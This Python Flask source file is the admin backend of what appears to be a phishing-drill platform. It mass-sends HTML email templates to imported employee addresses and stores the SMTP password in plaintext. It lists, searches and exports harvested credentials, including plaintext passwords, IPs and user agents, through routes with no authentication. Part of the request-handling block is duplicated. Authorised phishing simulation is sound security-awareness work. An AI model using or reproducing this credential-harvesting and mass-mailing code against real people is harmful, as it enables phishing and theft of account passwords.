
from flask import Blueprint, render_template, request, send_file, redirect, url_for, flash
import os
import csv
import io
from app.models.creds_model import Credential, Employee
from app.models.creds_model import db
from app.utils.logger import logger

def create_admin_bp(url_prefix):
    admin_bp = Blueprint('admin', __name__, url_prefix=url_prefix)


    @admin_bp.route('/email_manager', methods=['GET', 'POST'])
    def email_manager():
        import json
        config_path = os.path.join(os.path.dirname(__file__), '../../instance/email_config.json')
        templates_dir = os.path.join(os.path.dirname(__file__), '../../scripts/send_emails/email_templates')
        smtp_server = smtp_port = sender_email = sender_pass = template_name = sender_name = mail_subject = ''
        template_html = ''
        send_result = ''
        logger.info(f'Flask SQLALCHEMY_DATABASE_URI: {db.engine.url}')
        if os.path.exists(config_path):
            with open(config_path, 'r', encoding='utf-8') as f:
                try:
                    cfg = json.load(f)
                    smtp_server = cfg.get('smtp_server','')
                    smtp_port = cfg.get('smtp_port','')
                    sender_email = cfg.get('sender_email','')
                    sender_pass = cfg.get('sender_pass','')
                    sender_name = cfg.get('sender_name','')
                    mail_subject = cfg.get('mail_subject','')
                    template_name = cfg.get('template_name','')
                except Exception:
                    pass
        templates = [f for f in os.listdir(templates_dir) if f.endswith('.html')]
        if not template_name and templates:
            template_name = templates[0]
        # 获取所有员工邮箱
        employees = Employee.query.all()
        recipients = '\n'.join([e.email for e in employees])
        if request.method == 'POST':
            action = request.form.get('action')
            logger.info(f'action: {action}')
            if action == 'save_config':
                smtp_server = request.form.get('smtp_server','')
                smtp_port = request.form.get('smtp_port','')
                sender_email = request.form.get('sender_email','')
                sender_pass = request.form.get('sender_pass','')
                sender_name = request.form.get('sender_name','')
                mail_subject = request.form.get('mail_subject','')
                template_name = request.form.get('template_name','')
                with open(config_path, 'w', encoding='utf-8') as f:
                    json.dump({
                        'smtp_server': smtp_server,
                        'smtp_port': int(smtp_port) if smtp_port else '',
                        'sender_email': sender_email,
                        'sender_pass': sender_pass,
                        'sender_name': sender_name,
                        'mail_subject': mail_subject,
                        'template_name': template_name
                    }, f, ensure_ascii=False, indent=2)
                flash('配置已保存')
            if request.method == 'POST':
                action = request.form.get('action')
                logger.info(f'action: {action}')
                if action == 'save_config':
                    smtp_server = request.form.get('smtp_server','')
                    smtp_port = request.form.get('smtp_port','')
                    sender_email = request.form.get('sender_email','')
                    sender_pass = request.form.get('sender_pass','')
                    template_name = request.form.get('template_name','')
                    with open(config_path, 'w', encoding='utf-8') as f:
                        json.dump({
                            'smtp_server': smtp_server,
                            'smtp_port': int(smtp_port) if smtp_port else '',
                            'sender_email': sender_email,
                            'sender_pass': sender_pass,
                            'template_name': template_name
                        }, f, ensure_ascii=False, indent=2)
                    flash('配置已保存')
                elif action == 'preview_template':
                    template_name = request.form.get('template_name','')
                    with open(os.path.join(templates_dir, template_name), 'r', encoding='utf-8') as f:
                        template_html = f.read()
                elif action == 'import_recipients':
                    logger.info('已进入import_recipients分支')
                    # 支持文本框或文件导入，批量写入Employee表
                    recipients = request.form.get('recipients','')
                    logger.info(f'收到表单recipients内容: {recipients}')
                    file = request.files.get('recipients_file')
                    if file and file.filename:
                        file_content = file.read().decode('utf-8')
                        logger.info(f'收到文件内容: {file_content}')
                        if file_content.strip():
                            recipients = file_content
                    emails = [x.strip() for x in recipients.splitlines() if x.strip()]
                    logger.info(f'解析到emails: {emails}')
                    # 只导入新邮箱，避免重复
                    exist_emails = set(e.email for e in Employee.query.all())
                    for email in emails:
                        if email and email not in exist_emails:
                            # name字段不能为空，取@前前缀或全邮箱
                            name = email.split('@')[0] if '@' in email else email
                            logger.info(f'即将写入: name={name}, email={email}')
                            emp = Employee(name=name, email=email)
                            db.session.add(emp)
                    try:
                        db.session.commit()
                        logger.info('db.session.commit()成功')
                    except Exception as e:
                        logger.error(f'db.session.commit()异常: {e}')
                    flash('收信人已导入')
                elif action == 'clear_recipients':
                    Employee.query.delete()
                    db.session.commit()
                    flash('收信人已清空')
                elif action == 'send_mail':
                    import smtplib
                    from email.mime.text import MIMEText
                    from email.header import Header
                    from email.utils import formataddr
                    smtp_server = request.form.get('smtp_server','')
                    smtp_port = int(request.form.get('smtp_port','25'))
                    sender_email = request.form.get('sender_email','')
                    sender_pass = request.form.get('sender_pass','')
                    sender_name = request.form.get('sender_name','')
                    mail_subject = request.form.get('mail_subject','')
                    template_name = request.form.get('template_name','')
                    with open(os.path.join(templates_dir, template_name), 'r', encoding='utf-8') as f:
                        template_html = f.read()
                    # 直接用数据库Employee表收信人
                    employees = Employee.query.all()
                    to_list = [e.email for e in employees if e.email]
                    sent_count = 0
                    for to_addr in to_list:
                        try:
                            msg = MIMEText(template_html, 'html', 'utf-8')
                            msg['From'] = formataddr((str(sender_name or sender_email), sender_email))
                            msg['To'] = to_addr
                            msg['Subject'] = Header(mail_subject or '安全演练邮件', 'utf-8')
                            if smtp_port == 465:
                                s = smtplib.SMTP_SSL(smtp_server, smtp_port, timeout=10)
                            else:
                                s = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
                                if smtp_port == 587:
                                    s.starttls()
                            s.login(sender_email, sender_pass)
                            s.sendmail(sender_email, [to_addr], msg.as_string())
                            s.quit()
                            sent_count += 1
                        except Exception as e:
                            send_result += f"发送到 {to_addr} 失败: {e}\n"
                    send_result += f"成功发送 {sent_count} 封邮件。"
                # (已移入 import_recipients 分支，其他分支不再引用 emails，避免 UnboundLocalError)
            # 刷新收信人
            employees = Employee.query.order_by(Employee.id.desc()).all()
            recipients = '\n'.join([e.email for e in employees])
        if not template_html and template_name:
            try:
                with open(os.path.join(templates_dir, template_name), 'r', encoding='utf-8') as f:
                    template_html = f.read()
            except:
                template_html = ''
        return render_template('admin/email_manager.html',
            smtp_server=smtp_server, smtp_port=smtp_port, sender_email=sender_email, sender_pass=sender_pass,
            sender_name=sender_name, mail_subject=mail_subject,
            templates=templates, template_name=template_name, recipients=recipients,
            template_html=template_html, send_result=send_result)

    @admin_bp.route('/creds', methods=['GET', 'POST'])
    def creds_list():
        username = request.values.get('username', '').strip()
        ip = request.values.get('ip', '').strip()
        scene = request.values.get('scene', '').strip()
        query = Credential.query
        if username:
            query = query.filter(Credential.username.like(f"%{username}%"))
        if ip:
            query = query.filter(Credential.ip.like(f"%{ip}%"))
        if scene:
            query = query.filter(Credential.scene.like(f"%{scene}%"))
        creds = query.order_by(Credential.timestamp.desc()).all()
        # 仪表盘统计数据
        cred_count = Credential.query.count()
        emp_count = Employee.query.count()
        if request.method == 'POST' and request.form.get('action') == 'delete':
            ids = request.form.getlist('delete_ids')
            if ids:
                Credential.query.filter(Credential.id.in_(ids)).delete(synchronize_session=False)
                db.session.commit()
                return redirect(url_for('admin.creds_list'))
        return render_template('admin/creds_list.html', creds=creds, username=username, ip=ip, scene=scene, cred_count=cred_count, emp_count=emp_count)

    @admin_bp.route('/creds/export')
    def creds_export():
        query = Credential.query.order_by(Credential.timestamp.desc())
        output = io.StringIO()
        writer = csv.writer(output)
        writer.writerow(['ID', '用户名', '明文密码', 'IP', '时间', '页面标识', 'User-Agent', '扩展信息'])
        for c in query:
            writer.writerow([
                c.id, c.username, c.raw_password, c.ip, c.timestamp, c.scene, c.user_agent, c.extra_info
            ])
        output.seek(0)
        return send_file(io.BytesIO(output.getvalue().encode('utf-8-sig')),
                         mimetype='text/csv',
                         as_attachment=True,
                         download_name='creds_export.csv')

    return admin_bp
